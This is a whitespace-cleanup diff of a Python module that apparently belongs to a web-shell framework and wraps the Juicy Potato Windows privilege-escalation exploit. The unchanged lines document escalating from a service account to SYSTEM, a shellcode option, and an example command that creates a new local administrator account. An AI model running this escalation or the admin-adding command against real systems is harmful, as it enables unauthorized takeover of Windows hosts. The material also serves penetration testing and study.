@@ -20,21 +20,21 @@ class Privesc_juicy_potato(Module):
         Authors:    @decoder @ohpe @phra @lupman
         Links:      https://github.com/ohpe/juicy-potato
                     https://github.com/phra/metasploit-framework/blob/e69d509bdf5c955e673be44b8d87b915272836d9/modules/exploits/windows/local/ms16_075_reflection_juicy.rb
-        
-        
+
+
         Juicy Potato is a Local Privilege Escalation tool that allows to escalate privileges from a Windows Service
         Accounts to NT AUTHORITY\SYSTEM.
         This permits to run an os command as the most privileged user 'NT AUTHORITY\SYSTEM'.
-        It is needed that the service account running w3wp.exe has the permission of 'SeImpersonatePrivilege' enabled. 
-        You can check it with 'whoami /priv' 
-        
+        It is needed that the service account running w3wp.exe has the permission of 'SeImpersonatePrivilege' enabled.
+        You can check it with 'whoami /priv'
+
         This vulnerability is no longer exploitable with Windows Server 2019:
         https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
-        
-        
+
+
         Usage:
             #privesc_juicy_potato cmd [exec_type] [clsid] [custom_shellcode_path]
-        
+
         Positional arguments:
             cmd                     command supported by cmd.exe
             exec_type               Type of execution of juicy potato, values can be:
@@ -46,7 +46,7 @@ class Privesc_juicy_potato(Module):
             custom_shellcode_path   path to a file containing shellcode (format raw)
                                     if set, this module will ignore 'cmd' argument
                                     Default: 'default'
-        
+
         Examples:
             Add a new local admin:
                 #privesc_juicy_potato 'net user /add admin_test JuicyAdmin_1_2_3! /Y & net localgroup Administrators admin_test /add'
@@ -59,7 +59,7 @@ class Privesc_juicy_potato(Module):
     _runtime_code = r"""
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    public class SharPyShell
-                   {                    
+                   {
                        string ExecCmd(string exe_path, string arguments, string cmd, string working_path)
                        {
                            string cmd_path = Environment.GetEnvironmentVariable("ComSpec");
